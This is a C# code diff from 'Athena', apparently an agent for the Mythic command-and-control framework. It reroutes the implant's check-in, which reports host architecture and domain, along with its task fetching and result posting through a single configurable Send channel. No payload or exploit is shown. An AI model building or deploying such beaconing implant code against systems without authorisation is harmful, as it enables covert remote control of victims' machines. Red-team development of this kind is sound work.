@@ -37,7 +37,7 @@ namespace Athena
                 architecture = Misc.GetArch(),
                 domain = Environment.UserDomainName,
             };
-            var responseString = Send(ct).Result;
+            var responseString = this.MythicConfig.currentConfig.Send(ct).Result;
             try
             {
                 
@@ -52,7 +52,7 @@ namespace Athena
                 }
                 return cs;
             }
-            catch (Exception e)
+            catch
             {
                 return new CheckinResponse();
             }
@@ -68,7 +68,7 @@ namespace Athena
             };
             try
             {
-                var responseString = Send(gt).Result;
+                var responseString = this.MythicConfig.currentConfig.Send(gt).Result;
                 GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
                 return gtr.tasks;
             }
@@ -78,7 +78,7 @@ namespace Athena
             }
         }
 
-        public bool PostResponse(Dictionary<string,MythicJob> jobs)
+        public bool SendResponse(Dictionary<string,MythicJob> jobs)
         {
             List<ResponseResult> lrr = new List<ResponseResult>();
             foreach(var job in jobs.Values)
@@ -146,7 +146,7 @@ namespace Athena
 
             try
             {
-                var responseString = Send(prr).Result;
+                var responseString = this.MythicConfig.currentConfig.Send(prr).Result;
                 PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
                 if (cs.responses.Count < 1 || cs.responses[0].status != "success")
                 {
@@ -161,33 +161,21 @@ namespace Athena
 
             return true;
         }
-        private async Task<string> SendGET(string url)
-        {
-            try
-            {
-                var response = await Globals.client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
-                return await response.Content.ReadAsStringAsync();
-            }
-            catch
-            {
-                return "";
-            }
-        }
 
-        public async Task<string> Send(object message)
-        {
-            bool http = false;
-            bool websocket = true;
+        //public async Task<string> Send(object message)
+        //{
+        //    bool http = false;
+        //    bool websocket = true;
 
-            if (http)
-            {
-                return await this.MythicConfig.httpConfig.Send(message);
-            }
-            else if (websocket)
-            {
-                return await this.MythicConfig.websocketConfig.Send(message);
-            }
-            else return "";
-        }
+        //    if (http)
+        //    {
+        //        return await this.MythicConfig.currentConfig.Send(message);
+        //    }
+        //    else if (websocket)
+        //    {
+        //        return await this.MythicConfig.websocketConfig.Send(message);
+        //    }
+        //    else return "";
+        //}
     }
 }
